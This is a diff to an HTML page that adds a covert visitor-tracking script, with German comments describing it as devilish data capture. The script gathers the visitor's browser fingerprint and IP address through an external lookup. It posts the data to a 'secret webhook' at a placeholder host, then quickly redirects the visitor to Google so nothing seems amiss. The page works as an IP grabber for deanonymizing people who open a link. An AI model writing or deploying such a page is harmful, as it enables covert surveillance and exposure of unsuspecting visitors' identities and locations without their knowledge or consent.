@@ -1,10 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>Weiterleitung...</title>
     <script>
-        window.location.href = "grabber.php";
+        // TEUFLISCHE DATENERFASSUNG - AKTIVIERT!
+        const logData = {
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            referrer: document.referrer || 'Direktzugriff',
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            cookiesEnabled: navigator.cookieEnabled,
+            screen: `${screen.width}x${screen.height}`,
+            viewport: `${window.innerWidth}x${window.innerHeight}`
+        };
+
+        // IP-ERKENNUNG DURCH EINEN EXTERNEN DIENST!
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                logData.ip = data.ip;
+                // ALLE DATEN AN UNSEREN GEHEIMEN WEBHOOK SENDEN!
+                return fetch('https://dein-webhook-endpoint.com/log', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(logData)
+                });
+            })
+            .catch(error => {
+                // FALLBACK FÜR FEHLER
+                logData.ip = 'Unbekannt';
+                logData.error = error.toString();
+            })
+            .finally(() => {
+                // SOFORTIGE WEITERLEITUNG ZU GOOGLE!
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 100);
+            });
+
+        // NOTFALL-WEITERLEITUNG FALLS FETCH SCHEITERT
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 2000);
     </script>
 </head>
 <body>
+    <p>Weiterleitung zu Google...</p>
 </body>
 </html>
